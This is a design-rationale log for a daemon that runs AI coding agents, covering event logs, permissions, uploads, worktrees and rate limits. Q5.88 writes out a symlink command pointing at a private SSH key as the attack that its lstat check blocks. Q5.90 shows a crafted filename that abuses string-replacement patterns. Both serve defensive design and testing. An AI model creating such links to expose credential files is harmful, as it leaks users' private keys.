**Measured.** `daemoncheck` attaches at `since=0` over a real loopback socket
against 400 events of 48 KiB — a fifth of `ATTACH_REPLAY_MAX` and ~19 MiB, so the
fixture asserts as a measurement that only the byte ceiling can be what fired.
Exactly one `lagged` arrives, its reason is `backlog`, it names a range ending at
`lastSeq`, and `caught_up` still lands at the head. What is **not** asserted is the
second half — that a `backlog` collapse is not recorded toward the 4003 — because
one attach can only collapse once (`collapse` sets `cursor = head`, so the drain's
next `read` is empty), and a second needs real TCP backpressure, which Q6.28
already records as the untested path.

**Status.** Current

#### Q5.49 — Which two log bounds survive, and why are they a different act?

**Rule.** `truncateEvent` still shortens a single oversized event at 128 KiB and
says so in the text it leaves behind; `SqliteSessionStore.prune` still keeps
7 days / 200 sessions, removing a session *entire*, with its events.

**Why.** A local, visible cut is not the removal of something a person wrote.
The line is: a conversation is kept whole or not at all, never trimmed to a
suffix.

**Status.** Current

#### Q5.50 — Why does the emit path never await?

**Rule.** `SessionLog.append` is synchronous and so is `EventStore`. A
connection's listener is a synchronous array push and nothing more.

**Why.** That path runs inside the agent's RPC handler, so anything that blocks
there blocks the agent.

**Status.** Current

#### Q5.51 — Why does `EventStore` stay synchronous, `read` included?

**Rule.** `EventStore` stays synchronous, `read` included. If an async store is
ever needed, put it behind a write-behind buffer rather than making `append`
async.

**Why.** Node's SQLite bindings are synchronous, so async buys nothing — and it
costs the attach-is-one-synchronous-block argument below.

**Status.** Current

#### Q5.52 — Why is attach one synchronous block?

**Rule.** In `StreamConnection.attach` there is no `await` between
`log.read(since)` and `log.subscribe(...)`.

**Why.** That is the entire reason resume has no gaps and no duplicates: an
append lands strictly in the backlog or strictly through the listener.
Introducing an await there reopens the race, and the `seq <= cursor` filter
alone will not save you.

**Status.** Current

#### Q5.53 — Why does fan-out guard every listener individually?

**Rule.** `SessionLog.append` wraps each listener call in `try/catch` and evicts
the thrower.

**Why.** Unguarded, one broken connection aborts the loop and every *later*
listener silently misses that seq.

**Status.** Current

### Permissions and the registry

#### Q5.54 — Why does `settle()` resolve the agent before it logs?

**Rule.** Order is: `pending.delete` (the compare-and-swap) → record in
`resolved` → **resolve the agent's promise** → append → fan out.

**Why.** Appending first means a throw leaves the permission recorded as
answered while the agent's reverse-RPC is never answered — a permanent hang that
also switches off `status: "blocked"`, the one signal that would reveal it.

**Measured.** `pnpm daemoncheck` drives this against an agent that genuinely
waits — the turn does not end until the answer comes back — so the ordering is
asserted through its only observable consequence: the agent is handed the option
a human picked. Deleting `pending.delete` fails **twelve** cases including the
two-clients-at-once one; making the resolve a no-op fails **seventeen**. Both
measured, which is what makes those assertions coverage rather than decoration.

**Status.** Current

#### Q5.55 — Why were those driver counts first written as "ten" and "four", and why does the correction matter?

**Rule.** Driver reads are guarded — `waitingOn`, and one shared
`answerPermission` whose parse cannot throw — so a broken invariant produces a
red line and a count instead of a stack trace.

**Why.** The counts were truncated by a crash: the block read
`pendingPermissions[0]!.permissionId` and `body.error.code` unguarded, and a
non-null assertion is erased at runtime — so a regression printed some `FAIL`
lines and then died with a `TypeError`, with no failure total and with every
later section of the driver, the expired-id block and `/clear` included, never
executed at all. In a repository where the drivers are the whole safety net,
"four" was not a small blast radius, it was thirteen failures the crash got to
before the driver did.

**Measured.** "ten" and "four" corrected to twelve and seventeen.

**Status.** Current

#### Q5.56 — Why does the permission promise executor hold exactly one statement?

**Rule.** Only the resolve capture.

**Why.** A throw inside an executor rejects the promise, which would answer the
agent with an error while leaving the entry in `pending` — the session then
advertises `blocked` forever on something already refused.

**Status.** Current

#### Q5.57 — Why does the registry append permission events rather than `session.ts`?

**Rule.** The registry appends permission events, not `session.ts`.

**Why.** `Session`'s `EventQueue` drains only while a prompt generator is being
consumed, so an event pushed there outside a turn is stranded — logged after its
own resolution, or discarded by `queue.close()`.

**Status.** Current

#### Q5.58 — Why do agents spawn `detached` and get killed by process group?

**Rule.** `detached: true` on the spawn, and the kill is by process group. It
applies to the **login** pty as well.

**Why.** `claude-agent-acp` runs the `claude` CLI as its own child and cleans up
only via `process.on("exit")`, which does not run under SIGKILL. Killing the pid
alone strands a grandchild holding the session cwd. Verified, not theoretical.
`script` forks the CLI and the CLI may fork again, so a kill ladder that reaches
only `script` strands a pty for every login somebody walked away from. The rule
did not weaken when the agent moved into a container — it relocated (into
`setsid -w` and a pgid file, because signalling a `docker exec` client does not
reach inside) and has now relocated back.

**Status.** Current

#### Q5.59 — Why is every RPC that writes to agent stdin bounded?

**Rule.** Every RPC that writes to agent stdin carries a timeout.

**Why.** The SDK puts no timeout on those writes. In `doDispose` they sit
upstream of `client.close()`, the only code that ever sends SIGTERM/SIGKILL, so
an unbounded await there means an orphan.

**Status.** Current

### The agent's state on the snapshot

#### Q5.60 — Why are the agent's controls complete state on the snapshot rather than a delta or a log entry?

**Rule.** ACP's `current_mode_update` carries just the new mode id, so
`session.ts` merges it against what it holds before emitting `agent_config`, and
the complete state rides `SessionSnapshot`. The registry appends the event, not
`session.ts`.

**Why.** Otherwise every client needs a reducer of its own and disagrees with
the snapshot the moment it misses one. It rides the snapshot because
`session_started` lands in the log *after* the first `prompt` event: a client
reading the controls off the transcript alone would draw nothing until the
session's first reply, which is exactly when somebody wants to pick a mode. The
registry appends for the same reason it appends permission events — `Session`'s
queue drains only inside a turn.

**Status.** Current

#### Q5.61 — Why is "snapshot" not the same as "poll"?

**Rule.** `server.ts`'s `unsubWatch` sends a `{type:"snapshot"}` frame to every
attached client on every `touchSafe()`, so the snapshot is a *push* channel and
"snapshot-only" costs nothing in latency. `title`, `pinned` and `contextUsage`
are snapshot-only.

**Why.** State which does not belong in a transcript stays out of the log
entirely — a rename is not something the agent said, and a token count
superseded microseconds later is not narrative.

**Status.** Current

#### Q5.62 — Why is a streaming measurement fanned out only on the value a client can see?

**Rule.** `applyContextUsage` assigns the field on every update — a poller and a
fresh attach always read the exact number — and calls `touchSafe` only when the
whole percent, the window size or the cost changed. `usageWorthAnnouncing` is
pure and `pnpm daemoncheck` asserts it. `applyAgentConfig` still touches
unconditionally, because a mode change has no rate.

**Why.** `touchSafe()` builds a snapshot, writes a row and enqueues a frame *per
attached client*, on the agent's own synchronous emit path — so mirroring
`usage_update` unconditionally is thousands of frames per turn against an
8000-item outbound queue, which is not a slow consumer, it is us.

**Measured.** 2026-07-31 against claude-agent-acp 0.63.0: `usage_update` is
emitted from the `message_delta` handler (`acp-agent.js:2498`), i.e. on
essentially every output token.

**Status.** Current

#### Q5.63 — Why is a config option found by `category` and never by `id`?

**Rule.** A config option is found by ACP's `category`, never by `id`, and an
unknown or absent category renders as a plain labelled control rather than
disappearing. The *values* are not hardcoded either.

**Why.** Claude publishes reasoning effort as `effort` with values
`default|low|…|max`; kimi publishes the same concept as `thinking` with values
`off|…`. They share nothing but `category`, which exists for this and which the
spec says must not be required for correctness. claude drops `bypassPermissions`
from `availableModes` when it runs as root without `IS_SANDBOX`, so a fixed list
would offer a mode the agent rejects.

**Status.** Current

#### Q5.64 — Why are `/model`, `/effort` and `/mode` named by this client rather than by the agent?

**Rule.** `/model`, `/effort` and `/mode` are not commands any of the three agents
publishes — they are built from the controls, keyed on category, and the name is
ours precisely because the id is not portable. Read this before touching
`buildCommands`.

**Why.** An id-keyed table would give claude a `/effort` and kimi nothing,
silently, on one agent only.

**Status.** Current

#### Q5.65 — Why is a command list state, replaced whole, and kept off the poll?

**Rule.** Three claims, each of which was a live temptation. *Replaced whole*:
ACP defines `available_commands_update` as a full list and the adapter's own
comment tells clients to replace their cache. *State, not narrative*: nothing is
appended to the log, and it is not a `SessionEvent`. *Off the poll*: only
`commandsRevision`, a number, is on `SessionSnapshot`; the list is behind
`GET /sessions/:id/commands`. A client refetches on `!==` and never on `>`.

**Why.** Merging would keep offering a command the agent has withdrawn, and the
agent would then refuse the thing its own menu had offered. A logged list would
cost the operator's own first prompt to re-record something that never
accumulates, since the log evicts a **prefix**. The compiler *used* to be no help
on the event question: `estimateBytes` ended `default: return 192` and
`truncateEvent` ended `default: return event`, so a new event type carrying a
command list would have been accounted at 192 bytes against the byte budget and
never truncated, silently. Both `default` arms are gone now and every member of
the union has an explicit arm, so adding one is a compile error in both places —
see Q5's rule on the same subject. A
pending permission earns its 8 KiB on the snapshot because a blocked session has
to be answerable **from the list**; a command list is neither tiny nor needed to
answer *does anything anywhere need me*. A restart puts the revision back to 0
while a client still holds 5, and the answer there is to drop the list, not to
conclude the daemon is behind.

**Rejected.** Clamping the list to poll size — worse rather than cheaper, since
a menu with no `/compact` because it sorted seventeenth is not a smaller menu,
it is a wrong one; `truncateEvent`'s `agent_config` arm already names the
failure.

**Status.** Current

### Logins and the composer's keys

#### Q5.66 — Why is a login driven over HTTP rather than over the WebSocket?

**Rule.** Output is polled; a typed code is a `POST` whose response confirms it
landed. This is the read-only-WS rule rather than an exception to it.

**Why.** `ws.send()` into a half-open socket succeeds silently, and a one-time
login code is the worst possible message to lose that way — sent once,
unrecoverable, and impossible to notice missing from the other end.

**Status.** Current

#### Q5.67 — Why does the login probe run with the pasted credential in its environment?

**Rule.** The probe is executed with the stored credential merged into its
environment. `pnpm daemoncheck` drives every branch through
`LocalRuntimeOptions.exec`.

**Why.** The whole asymmetry rests on it: a clean `false` from
`claude auth status` is believed over a token somebody pasted, and "cannot tell"
falls back to the token. That is only honest if the CLI has *seen* the token —
and it had not, because `execFile` was called with no `env` and inherited the
daemon's, while a pasted credential lives in SQLite and was merged only at
spawn. So a wrong or expired token reported `loggedIn: true`: the Settings
screen said signed in and the first session answered `502 agent_auth_required`,
which is the exact failure this probe was added to prevent.

**Status.** Current

#### Q5.68 — Why is the login command a table lookup and never a request field?

**Rule.** There is no route, body field or header anywhere that names a program
to run.

**Why.** "A caller cannot run code of their choosing as the daemon" is therefore
a property of there being nothing to pass, not a validation somebody has to
remember to write — and it cannot be reopened by a convenience parameter later,
because there is nothing to add one to.

**Status.** Current

#### Q5.69 — Why is the IME guard the load-bearing half of "Enter sends"?

**Rule.** `shouldSend` is a pure function in `keys.ts` and checks for an
in-flight input-method composition before treating Enter as a send.

**Why.** With a Russian, Chinese, Japanese or Korean input method, Enter commits
the candidate being typed — the text is not in the box yet. A bare
`key === "Enter"` sends a half-finished word and swallows the keystroke meant to
finish it, on every message, for everyone on one of those layouts, and it is
invisible from a Latin keyboard. Being pure is the only way `webcheck` can
assert it with no DOM.

**Status.** Current

#### Q5.70 — Why does the command menu take Enter first, and why is Enter the only key it takes?

**Rule.** `composerKey` in `keys.ts` resolves the collision: the menu takes
Enter while open, `shouldSend` takes it otherwise, asserted in both states of
`menuOpen`. `completionKey` carries its **own** IME guard. Escape additionally
calls `stopPropagation`.

**Why.** The resolution used to be two blocks inside `Composer`'s `onKeyDown`
prop, and the documentation claimed `webcheck` asserted it — what `webcheck`
asserted was that the collision *exists*, which stays green with the two blocks
in either order, while reversing them sends a half-typed message instead of
completing a command. `completionKey` runs first, so without its own guard the
IME defect would simply move house: Enter would insert a command instead of
finishing a word. `useKeyboard` binds Escape on `window` to blur whatever has
focus, and dismissing a menu must not also dismiss the soft keyboard.

**Status.** Current

### Files, uploads and downloads

#### Q5.71 — Why is a downloaded file never rendered, and why are two mechanisms needed?

**Rule.** The daemon sends `application/octet-stream` — always, never sniffed,
never the mime the uploader declared, never derived from an extension — plus
`attachment`, `nosniff` and `no-store`; and the client re-types the `Blob` to
`application/octet-stream` before creating an object URL for it. Never
`window.open(blobUrl)`, never `target="_blank"` without `download`, never an
`<iframe src=blobUrl>`.

**Why.** A `blob:` URL carries the *client's* type and inherits the *creating*
origin, so both halves are needed. The reason is stronger than the usual
stored-XSS one, and it used to be stated as `?token=`: `readCredential` accepted
a token in the query on any route, so any download opened in a tab carried a live
daemon token in `location.search` for script in a rendered response to read and
reach every route on that daemon with.

**That premise is now false and the rule is unchanged, which is the point of
recording it.** `readCredential` reads the query credential only on a request
carrying `upgrade: websocket` (Q1.45), so no download URL can carry one. What
still stands, and is the stronger reason, is that this route serves **any regular
file under a session's workspace**: a rendered HTML or SVG response executes on
the daemon's own origin whatever credential fetched it, where it can reach every
route with whatever the embedding page holds, and a `blob:` made from it inherits
that origin. On the client side the origin creating the blob is the one whose
`localStorage` holds `reemoat.credential`, with no CSP anywhere behind it.
`nosniff` is not redundant beside `attachment` — it also stops a proxy or a CDN in
front of the daemon re-typing the body — and `no-store` because the response is a
private file fetched under a bearer credential.

**Status.** Current

#### Q5.72 — Why is an oversized upload refused on the header first, and why is the body always cancelled?

**Rule.** A truthful `Content-Length` over the limit is refused before a byte is
read; the running byte counter in `Uploads.receive` is the backstop for chunked
bodies and for clients that lie. The body is always cancelled: unlink, then
rmdir, then cancel.

**Why.** That counter is the only bound on a request body anywhere in this
system — nothing in `src/`, the relay or the control plane configures one, and
the relay pipes bodies straight through. Refusing a *half-read* body destroys
the request stream, which through the relay destroys the HTTP/2 CONNECT stream
carrying it, and that surfaces at the browser as the relay's own
`502 tunnel_failed` instead of the 413 the daemon wrote. Cancelling matters more
than the order: the relay's per-stream window is granted on consumption, so a
reader that simply stops parks the sender at 256 KiB, and the next valve above
that is the tunnel's 8 MiB socket-buffer check — which closes the **whole tunnel
for that machine**, taking every other session on it.

**Status.** Current

#### Q5.73 — Which of the four upload refusals actually pins `cancelBody`?

**Rule.** The assertions that nothing was read (`pulled: 0`) are the
load-bearing ones; the mid-body pair assert the property rather than the call,
which is written at the cases themselves so nobody deletes a line believing it
is covered.

**Measured.** By deleting each `cancelBody` call in turn: removing the one after
the read loop — `too_large`, `quota` — changes nothing, because breaking out of
a `for await` calls the async iterator's `return()` and that cancels the stream
anyway. Removing the one on a refusal reached *before* the loop — `too_many`, an
unusable session id — fails immediately.

**Status.** Current

#### Q5.74 — Why must the two remover trees never nest?

**Rule.** `removeWorkspace` guards the codebase's original `rmSync` with
`containedIn(root, worktreeRoot)`; the upload sweep guards the second one with
the mirror. `daemon.ts` refuses to start if either root sits at or under the
other, `daemoncheck` asserts it in both directions, and the sweep additionally
`lstat`s each session directory for a symlink.

**Why.** If either root sat at or under the other, one remover could reach into
the other's tree and neither guard would mean what it says. The symlink refusal
is the same one `worktree.ts` makes, for the same reason, since an upload id is
guessable from a transcript.

**Status.** Current

### The store, its floors and the wire

#### Q5.75 — Why is the WebSocket read-only?

**Rule.** Everything that mutates state is an HTTP request.

**Why.** `ws.send()` into a half-open socket succeeds silently, so an answer
sent over the socket from a dying client would evaporate with no error anywhere.

**Status.** Current

#### Q5.76 — Why is status derived and never stored?

**Rule.** `ManagedSession.status` is computed on every read from `exitRecord` /
`stopRequested` / `pending.size` / `turn`. `snapshot()` returns a frozen plain
object with copied arrays.

**Why.** It cannot then drift from the pending map, and a frame built now and
serialized later must describe now.

**Status.** Current

#### Q5.77 — Why is size accounting null-safe on `FileChangeEvent.oldText`?

**Rule.** Size accounting treats `oldText` as nullable.

**Why.** It is `null` for every file the agent *creates*, which is the common
case, not an edge case.

**Status.** Current

#### Q5.78 — Why does a failed insert become a placeholder at the same seq rather than a hole?

**Rule.** A failed insert becomes a placeholder at the same seq, and the
placeholder is also what `append` returns, not the real event.

**Why.** `read` is `WHERE seq > ?`, so a hole cannot spin the attach loop — it
does something worse: `lagged` is derived from `firstSeq`/`lastSeq`, so a gap in
the *middle* of the log is invisible on the wire and no client can detect it.
Handing a live client the real text at seq 412 while a reconnecting client gets
a placeholder there makes the two disagree about what 412 *is*, undetectably.
Both losing it is better.

**Status.** Current

#### Q5.79 — Why can the store not append to itself?

**Rule.** `SessionLog.append` fans out only what its own call to `store.append`
returned. Degradation is reported through the placeholder and the `onDegraded`
callback, never by logging an extra event.

**Why.** A store-internal recursive append lands on disk and reaches no
subscriber.

**Status.** Current

#### Q5.80 — Why are `lastSeq` and `dropped` floors on the session row, raised at load?

**Rule.** `lastSeq`/`dropped` are floors on the session row, raised at load.

**Why.** A session whose events were pruned would otherwise restart at seq 1,
and a client resuming from a cursor it already holds would be clamped to 0 by
`attach` and replayed — receiving *different events under numbers it has already
seen*.

**Status.** Current

#### Q5.81 — Why is `gap` derived from `oldestAvailable()` and never from `firstSeq` alone?

**Rule.** `count > 0 ? firstSeq : lastSeq + 1` is the only form that stays
honest when the log is empty but the sequence is not, and both `attach` and
`GET /sessions/:id/events` have to use it or they disagree about the same
session.

**Why.** `firstSeq` is 0 when the table holds no row for a session, so
`since < firstSeq - 1` is `since < -1` — false for every cursor, on the one path
where *everything* was lost. That state is reachable twice over: a disk
rejecting every insert burns seqs and stores nothing, and a `remove()` that
deleted the events and threw before the session row leaves the floors behind
with no rows under them.

**Measured.** Stats `{firstSeq: 0, lastSeq: 500, count: 0}` answered a `since=0`
attach with `gap: false`, no backlog, `caught_up: 0`, then the next live event at
seq 501.

**Status.** Current

#### Q5.82 — Why are the floors asserted against the real store rather than the memory one?

**Rule.** `daemoncheck` drives `SqliteEventStore` directly: the round trip
across a reopen, eviction taking a strict *prefix* with `firstSeq = dropped + 1`
and the newest row never taken, the placeholder that lands at the same seq when
serialization throws, and `seedFloors`.

**Why.** Every registry case in `daemoncheck` backs its sessions with
`MemoryEventStore`, so `SqliteEventStore` — the thing that actually holds
somebody's conversation across a restart — was named by no driver at all.

**Measured.** A session whose rows are gone continues at seq 501 rather than
restarting at 1. Deleting the `seedFloors` call fails exactly those three cases,
which is the failure a client would otherwise meet as *different events under
numbers it has already seen*.

**Status.** Current

#### Q5.83 — Why does `doStop` use `exitRecord ??=`?

**Rule.** `doStop` assigns the exit record only if there is not one already.

**Why.** Stopping a restored session must not rewrite `daemon_restarted` as
`stopped`, which would erase the fact that a restart happened. `onStartFailed`
has always guarded itself this way; `doStop` did not.

**Status.** Current

#### Q5.84 — Why is orphan reaping fenced by `os.uptime()`?

**Rule.** Only a session created since the last boot may have its recorded pid
signalled.

**Why.** Pids wrap and a reboot resets them, so an older row names a number that
now belongs to somebody else.

**Status.** Current

### Resume, worktrees, git and the database on disk

#### Q5.85 — Why is resume `session/resume` and never `session/load`?

**Rule.** Resume is `session/resume`, never `session/load`.
`AcpClient.supportsSessionResume` reads `sessionCapabilities.resume`, and
`Session.resume` refuses an agent that lacks it before any network call.

**Why.** Load replays the whole message history back as `session/update`
notifications, and this daemon already holds that transcript — taking it again
would duplicate every event in the log. The rule turned out to be a *market*
constraint too: `loadSession` is the older, wider capability and
`sessionCapabilities.resume` the newer, narrower one, so "any ACP agent" is much
narrower than the ~30 entries in Zed's registry suggest. The honest gate on
making agents configurable is *how many implement
`sessionCapabilities.resume`*, not how many type references `AgentId` has.

**Measured.** 2026-07-30 against `gemini-cli` 0.53.0 — the ACP reference
implementation — `agentCapabilities` is
`{loadSession: true, promptCapabilities: …, mcpCapabilities: …}` with **no
`sessionCapabilities` key at all**. kimi advertises both: `loadSession: true`
*and* `sessionCapabilities: {list: {}, resume: {}}`.

**Status.** Current

#### Q5.86 — Why does worktree removal refuse by default and prune unconditionally?

**Rule.** The unpushed-commits check is ours, `@{upstream}` is not used because
it throws when unset, and `worktree prune --expire=now` runs on *every* removal
path including the ones that already failed. Nothing outside the managed
worktree root is ever `rm`ed, and a branch is never deleted unless it was
created here.

**Why.** `git worktree remove` already refuses on untracked files or tracked
modifications, but says nothing about unpushed commits. Pruning on every path is
what makes "leaves no stale metadata" true rather than hoped-for.

**Status.** Current

#### Q5.87 — Why does the unpushed-commits refusal not depend on the directory existing?

**Rule.** `countFromRepo` answers from `repoRoot`. `null` from these counts
means "could not tell" and must never be read as zero; only `--force` may skip
the question.

**Why.** The whole refusal block used to sit behind `status.exists`, and
`inspectWorkspace` returns early when the checkout is gone, so `commitsAhead`
and `unpushed` were both `null` and `--delete-branch` fell straight through to
`branch -D`. The commits are in the object database, not the checkout — a
directory somebody already `rm`ed is exactly when the branch is the *only* copy.

**Status.** Current

#### Q5.88 — Why are symlinks never content-diffed?

**Rule.** `lstat` first, always.

**Why.** `git diff --no-index` follows the link, so `ln -s ~/.ssh/id_rsa x`
would otherwise serve the target's bytes to anyone holding the bearer token.

**Status.** Current

#### Q5.89 — Why is `FileChange.symlink` only a hint, with `diffFile`'s own `lstat` as the guarantee?

**Rule.** The refusal to content-diff is decided in `diffFile` from the path
rather than from the listing. `daemoncheck` asserts both directions of the flag
*and* that the untracked link — the case the flag gets wrong — still diffs as
`kind: "symlink"` with no patch.

**Why.** The flag comes off the worktree mode of a porcelain-v2 `1`/`2`/`u`
record, and an **untracked** path is a `?` record carrying no mode at all — so a
symlink the agent just created is reported with `symlink: false`. Nothing
dangerous rests on it. A reader who found only the `true` case would reasonably
conclude the flag can be trusted.

**Status.** Current

#### Q5.90 — Why does the `--no-index` header rewrite replace with a function and never a string?

**Rule.** `() => rel` — a function replacement, which has no substitution
grammar.

**Why.** `String.replace(pattern, replacement)` expands `$&`, `` $` ``, `$'` and
`$$` in a string replacement, and the replacement here is a path the *agent*
chose.

**Measured.** A file named `a$&b.txt` rewrote to `--- a/atmp/wt/a$&b.txtb.txt` —
the absolute path the rewrite exists to remove, spliced back in, in the one
header that has to be right for `client diff … | git apply` to work. Asserted
against a real repository on a file actually named `a$&b.txt`: restoring the
string form fails one case and no other. The same fixture covers two things a
stub runner could never claim honestly — `--no-index` **exiting 1** being the
success path for a created file, and `--porcelain=v2` emitting `<new> <orig>`
where `diff --raw -z` emits `<src> <dst>`, so a shared "read two path tokens"
helper would invert every rename in exactly one of them.

**Status.** Current

#### Q5.91 — Why is the database directory chmodded rather than only the database file?

**Rule.** 0700 on the directory is the only form that holds.

**Why.** SQLite writes `-wal` and `-shm` beside the database on its own schedule
and they carry the same transcript bytes until a checkpoint folds them back —
with whatever the umask says. Chasing those files loses: they are recreated. And
`mkdirSync(mode)` applies its mode only to directories it actually created, so
an upgrade into an existing `~/.reemoat` keeps that directory's old bits.

**Status.** Current

#### Q5.94 — Why does the relay read the machine limit live rather than caching it like the signing keys?

**Rule.** No cache. `machineStanding` reads `user_machine_limits` and, only when
there is an ownership row and no override, `instance_settings` — on every proxied
request, beside the three reads `authorize` already makes.

**Why not `KEY_REFRESH_MS`.** That cache exists because a key-set miss is
reachable by an **unauthenticated** caller sending a random `kid`, so the read has
to be bounded without making rotation slow. Nothing below `verifySignature` can be
amplified that way: this read happens after the token has verified and after the
grant has been proved, alongside `machineById`, `activeUser` and `grantFor`, which
are already unconditional. The comparison is three statements becoming five, not
zero becoming one.

**Why a TTL would be wrong even if it were free.** In `external` mode the relay is
a separate **process** from the one that writes the row, so nothing can push an
invalidation — any window becomes the floor on "the admin raised my limit and it
still does not work", which is the support ticket this feature manufactures. This
repository has already paid once for a cache with no invalidation path: `app.ts`'s
SPA fallback held a copy of `index.html` taken at registration, `pnpm web:build`
rewrote `dist/` underneath it, and reloading on a session gave a blank page with
no error.

**The escape hatch, written down so nobody reaches for a timer.** If profiling
ever demands a cache, it is `PRAGMA data_version` — SQLite bumps it when *another
connection* commits, so the relay can invalidate on the API's write rather than on
a clock.

**Status.** Current

### Every number in one place

| | |
|---|---|
| Event log | **Unbounded per session — a conversation is never truncated.** 128 KiB per event stands (truncated at the store boundary, visibly: one oversized event shortened with `…[truncated N bytes]` left in it, not the removal of anything somebody wrote). `REEMOAT_LOG_EVENTS`/`REEMOAT_LOG_BYTES` still bound it for an operator who wants that, and `daemoncheck` drives eviction with `maxEventsPerSession: 8`, so the path stays exercised. What bounds the database is whole sessions instead — 7 days / 200, pruned at startup: kept whole or not at all, never trimmed to a suffix |
| Sessions on disk | 7 days / 200 sessions, pruned at startup. `GET /sessions` is unbounded by default and takes `?limit=`, which reorders blocked-first so a cut drops only rows nobody waits on — asserted at both ends of the rank: a pinned row beating other **terminal** rows on restored fixtures (`rowFor` hardcodes `status: "exited"`, so none of that fixture set is live), and a *blocked* row beating a pinned one where a session genuinely blocks, since a restored row can never hold a pending permission |
| Changes API | 2000 files, 512 KiB per diff, both reported as `truncated` rather than silently short |
| git calls | 5s structural, 10s list, 15s status/diff, **120s** `worktree add`. That line said "hooks, LFS smudge" at 30s while both were disabled on this path; they are live now, and a few hundred MB of LFS content would have 504'd the first session |
| WS outbound queue | 8000 events / 16 MiB, and **`ATTACH_REPLAY_MAX` 2000** under the *event* half only. The queue used to be sized above the log so a `since=0` attach could not overflow; with no log window there is nothing to be larger than, so the *attach* is bounded instead of the history. Past the cap the socket replays the newest 2000 and sends `lagged{reason:"backlog"}`, the one lagged reason that is not a loss: those events are on disk and `GET /sessions/:id/events` serves them. 2000 events can still be 250 MiB against a 16 MiB queue, so the byte ceiling collapses an attach too — and reports the same `backlog` (Q5.48) |
| `Session.EventQueue` | 2000, evicting only `agent_log`/`other`. Never plain drop-oldest: silently dropping `text` or `file_change` would produce a contiguous log that is missing content |
| Timeouts | start 45s, shutdown budget 20s, cancel-send 1s, session/close 2s, cancel grace 5s **on a dispose** and 1.5s on a turn somebody stopped (what follows the first is SIGKILL, and what follows the second is nothing), exit grace 3s, WS ping 20s, enrollment 15s |
| Tokens | 300s lifetime (control-plane default, floor 120s), 60s clock leeway either side. It used to be the revocation window; the relay's live grant check is now, so this bounds only a WebSocket already open |
| Enrollment codes | single-use, 1 hour. Burned early by **four** things, each recording *which* in `used_from` — minting the next code for that machine (`superseded`), revoking the machine (`revoked`), deleting the user who minted it (`user_deleted`) and **disabling** them (`user_disabled`, which `enable` does not undo); both people-shaped burns are Q1.42. One live code per machine is why "how many may somebody hold" is not a number |
| Relay streams | **1 MiB** h2 window per stream (`STREAM_WINDOW_BYTES` — raised from 256 KiB as the coupled half of `EVENTS_PAGE_BYTES`, Q6.104; three comments went on saying 256 and were corrected in Q5.101), 256 concurrent streams per tunnel, 64 per caller, 8 MiB connection window (`CONNECTION_WINDOW_BYTES`, its own constant — same number as the socket valve, different fact). The per-stream window **is** the flow control — granted on consumption, so a stalled client stops its sender there and nowhere else |
| Tunnel | 8 MiB socket-buffer valve (`MAX_TUNNEL_BUFFERED_BYTES`, should be unreachable; the windows exist to make it so), 20s ping / 2 misses, reconnect 1s→30s with **full** jitter — a relay restart reconnects a whole fleet at once, and ±20% would keep the herd synchronised. Backoff resets only after a tunnel has been up 60s (`TUNNEL_STABLE_AFTER_MS`) |
| Grants listing | 500 per page, 2000 max, with a `total` — the one admin list that grows as users × machines |
| Uploads | **100 MiB per file**, 10 per message, **1 GiB** *and* 100 files per session — two bounds because a byte cap cannot see a hundred thousand one-byte uploads and each of those is a directory — plus **300 MiB per 5 minutes** per session (`UPLOAD_RATE_BYTES`), the one refusal here that expires on its own and the only one carrying `Retry-After`. 200 bytes of filename, 128 of mime, both clamped at ingest so `truncateEvent` never has to touch an attachment. Inline images 5 MiB raw *to* the agent (~6.8 MiB of base64 in one write to its stdin); **25 MiB *from* one** (`MAX_AGENT_IMAGE_BYTES` — its own constant since the per-file cap moved, sharing one having put a ~133 MiB string in the base64 pre-check on the emit path). Unconsumed uploads expire at 24h; consumed ones have no TTL and die with their session row. Q5.101 |
| Downloads | 100 MiB, which **equals the upload cap by coincidence rather than by coupling** — this row said "deliberately not the upload number" and that was true at 25 MiB. Neither may be set by reading the other: that one bounds what a client may push onto disk against budgets outliving the request, this bounds a bearer-token-readable read of a whole workspace, where the cost of no bound is one of 256 tunnel streams held open for as long as somebody likes. The client refuses at the same number from `content-length`, before a `Blob` is resident on a phone |
| Permission payload | 8 KiB each for `rawInput` and `content`, clamped by `clampBlob`. Far below the per-event cap because this rides the snapshot, which `GET /sessions` returns for every session at once |
| Session title | 120 characters accepted from a rename, 60 for the one derived from the first prompt. Bounded for the same reason as the row above: it rides the snapshot, which `GET /sessions` returns for sixty sessions every four seconds |
| Agent login | one run per agent (a second supersedes), 64 KiB of transcript, 10 minute TTL. Pasted credentials capped at 8 KiB, which is far above an OAuth token and far below an argv |
| Passwords | scrypt N=2^15 r=8 p=1 — ~51ms on the machine this was measured on (Node 26, 2026-08-07), against ~25ms at 2^14 and ~103ms at 2^16 — holding `128·N·r` = 32 MiB for the duration of each. `maxmem` is passed explicitly at **128 MiB**, because Node's default ceiling is 32 MiB and OpenSSL refuses *at* the boundary: measured, N=2^15 r=8 throws `memory limit exceeded` while N=2^14 succeeds, and a KDF that throws for some parameter sets looks like a wrong password on one deployment rather than a configuration error. 12–256 characters, NFKC and never trimmed; the maximum is not about KDF cost (scrypt passes the input through one PBKDF2 iteration, so bcrypt's folklore does not apply) but about not storing a string somebody else sized. **4 concurrent hashes, at most 2 of them public** (Q1.39); wait lists per lane, 32 authenticated and 16 public, then `503 overloaded` with `Retry-After: 1` |
| Sessions | 30 days absolute, 14 idle, `last_seen_at` written at most once per 15 minutes — the guard that makes idle expiry affordable at all, since the alternative is an fsync per request on a `synchronous = FULL` database in the process carrying every tunnel. 10 per user, the **oldest revoked** rather than the newest refused, evicted inside the mint's own transaction. Each records what it said about itself, clamped at ingest: 256 characters of `User-Agent`, 64 of address. A revoked row is kept **7 days** and swept at startup with its origin — short because no reader surfaces it (`listSessions` and the admin count both filter `revoked_at IS NULL`), non-zero because deleting on revoke would make the day something does read it unanswerable |
| Login throttle | **5 failures per 15 minutes per `<name, address>` pair** (Q1.37), then 30s doubling to a 15-minute ceiling, the *exponent* clamped at 30 so `Infinity` is unreachable. A second instance under `ADDRESS_THROTTLE` counts **30 per address** — looser because that key is shared by everybody who appears to be at one address, and 5 would make one person's bad afternoon an office lockout; a `429` reports the longer of the two blocks. A password change is `passwordChangeKey(userId)`, its own namespace. 10 000 keys per instance, and past it settled entries go first and then the map is cleared outright — which lets somebody buy one reset for ten thousand requests, stated rather than hidden, because an unbounded map keyed by a caller-chosen string is the worse failure. 200 characters per composed key, 120 for the name half (a 200-character name would otherwise cut the address off and share one counter), 64 for an address. In memory: a restart clears it |
